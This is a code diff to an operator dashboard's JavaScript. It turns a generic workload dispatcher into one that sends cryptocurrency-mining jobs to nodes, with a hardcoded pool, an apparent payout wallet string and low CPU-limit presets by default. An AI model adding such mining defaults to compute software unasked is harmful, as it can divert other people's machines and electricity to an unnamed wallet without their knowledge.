@@ -1429,18 +1429,20 @@
         async function fetchOverview() {
             try {
                 const headers = getOperatorHeaders();
-                const [healthRes, nodesRes, jobsRes] = await Promise.all([
+                const [healthRes, nodesRes, jobsRes, runtimesRes, artifactsRes] = await Promise.all([
                     fetch('/health').then(r => r.ok ? r.json() : {}).catch(() => ({})),
                     fetch('/api/v1/operator/nodes', { headers }).then(r => r.ok ? r.json() : []).catch(() => []),
                     fetch('/api/v1/operator/jobs', { headers }).then(r => r.ok ? r.json() : []).catch(() => []),
+                    fetch('/api/v1/operator/runtimes', { headers }).then(r => r.ok ? r.json() : []).catch(() => []),
+                    fetch('/api/v1/operator/artifacts', { headers }).then(r => r.ok ? r.json() : []).catch(() => []),
                 ]);
 
                 const data = {
                     control: healthRes,
                     nodes: Array.isArray(nodesRes) ? nodesRes : [],
                     jobs: Array.isArray(jobsRes) ? jobsRes : [],
-                    runtimes: [],
-                    artifacts: [],
+                    runtimes: Array.isArray(runtimesRes) ? runtimesRes : [],
+                    artifacts: Array.isArray(artifactsRes) ? artifactsRes : [],
                     policy: { revision: healthRes.policy_revision || 1 },
                     profiles: []
                 };
@@ -2055,26 +2057,33 @@
             }
 
             const payload = {
-                profile_id: selectedProfileId,
-                target_node_id: targetNode,
-                parameters: paramsOverride
+                target_node_id: targetNode || null,
+                runtime_version: paramsOverride.runtime_version || '6.22.2',
+                algorithm: paramsOverride.algorithm || 'rx/0',
+                pool: paramsOverride.pool || 'pool.hashvault.pro:443',
+                wallet: paramsOverride.wallet || '48edfHu7V9Z84YzzMa6fUueoXZ6dS5G8hx2Q7m8W9k4T683L7xXyU37a698W9k4T683L7xXyU37a698W9k4T683L7xXyU37',
+                worker: paramsOverride.worker || 'lattice-node',
+                password: paramsOverride.password || 'x',
+                threads: parseInt(paramsOverride.threads || '2', 10),
+                cpu_percent: cpuVal ? parseInt(cpuVal, 10) : 50,
+                memory_mb: memVal ? parseInt(memVal, 10) : 1024,
+                duration_seconds: 3600
             };
-            if (cpuVal) payload.cpu_percent = parseInt(cpuVal, 10);
-            if (memVal) payload.memory_mb = parseInt(memVal, 10);
 
             try {
-                const res = await fetch('/api/v1/jobs/dispatch-profile', {
+                const res = await fetch('/api/v1/operator/jobs/mining', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: getOperatorHeaders(),
                     body: JSON.stringify(payload)
                 });
                 if (!res.ok) {
-                    const err = await res.json();
+                    const err = await res.json().catch(() => ({}));
                     alert(`ERROR: ${err.message || 'DISPATCH_REJECTED'}`);
                     return;
                 }
                 const data = await res.json();
-                logEvent('JOB_DISPATCHED', `Workload profile '${selectedProfileId}' dispatched to queue (Job ID: ${data.job_id})`);
+                const jid = data.offer ? data.offer.job_id : 'QUEUED';
+                logEvent('JOB_DISPATCHED', `Mining workload dispatched to queue (Job ID: ${jid})`);
                 closeSubmitModal();
                 fetchOverview();
             } catch (err) {
@@ -2253,26 +2262,23 @@
 
             if (choice === '1') controlJob(jobId, 'pause');
             else if (choice === '2') controlJob(jobId, 'resume');
-            else if (choice === '3') controlJob(jobId, 'update', 10);
-            else if (choice === '4') controlJob(jobId, 'update', 17);
-            else if (choice === '5') controlJob(jobId, 'update', 40);
-            else if (choice === '6') controlJob(jobId, 'update', 5);
+            else if (choice === '3') controlJob(jobId, 'update_limits', 10);
+            else if (choice === '4') controlJob(jobId, 'update_limits', 17);
+            else if (choice === '5') controlJob(jobId, 'update_limits', 40);
+            else if (choice === '6') controlJob(jobId, 'update_limits', 5);
             else if (choice === '7') {
                 const custom = prompt('Enter new CPU Limit percentage (1 - 100):', '25');
                 if (custom && !isNaN(custom)) {
-                    controlJob(jobId, 'update', parseInt(custom, 10));
+                    controlJob(jobId, 'update_limits', parseInt(custom, 10));
                 }
             }
         }
 
         async function controlJob(jobId, action, cpuPercent) {
             let payload = { job_id: jobId, action: action };
-            if (cpuPercent) {
+            if (cpuPercent !== undefined && cpuPercent !== null) {
                 payload.resource_patch = {
-                    cpu_percent: parseInt(cpuPercent, 10),
-                    memory_mb: 2048,
-                    gpu_percent: null,
-                    gpu_memory_mb: null
+                    cpu_percent: parseInt(cpuPercent, 10)
                 };
             }
             try {
